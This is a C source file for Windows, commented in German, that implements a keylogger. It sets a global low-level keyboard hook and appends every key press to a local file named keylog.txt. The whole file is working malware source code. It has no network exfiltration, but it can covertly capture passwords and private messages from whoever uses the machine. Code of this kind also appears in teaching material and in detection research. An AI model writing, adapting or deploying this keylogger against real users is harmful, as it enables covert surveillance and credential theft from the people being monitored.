#include <windows.h>
#include <stdio.h>

// Globale Datei, in die geloggt wird
FILE *logfile;

// Funktion, die jeden Tastendruck verarbeitet
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        
        // Wenn eine Taste gedrückt wird
        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = pKeyBoard->vkCode;
            
            // Schreibe den Tastencode in die Datei
            fprintf(logfile, "%c", vkCode);
            fflush(logfile);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Öffne Logdatei im Schreibmodus
    logfile = fopen("keylog.txt", "a+");
    if (!logfile) {
        printf("Konnte Logdatei nicht öffnen!\n");
        return 1;
    }

    // Setze Low-Level Keyboard Hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook) {
        printf("Fehler beim Setzen des Hooks!\n");
        fclose(logfile);
        return 1;
    }

    // Message Loop, um Tastatureingaben zu erfassen
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Entferne den Hook und schließe die Logdatei
    UnhookWindowsHookEx(keyboardHook);
    fclose(logfile);
    return 0;
}
 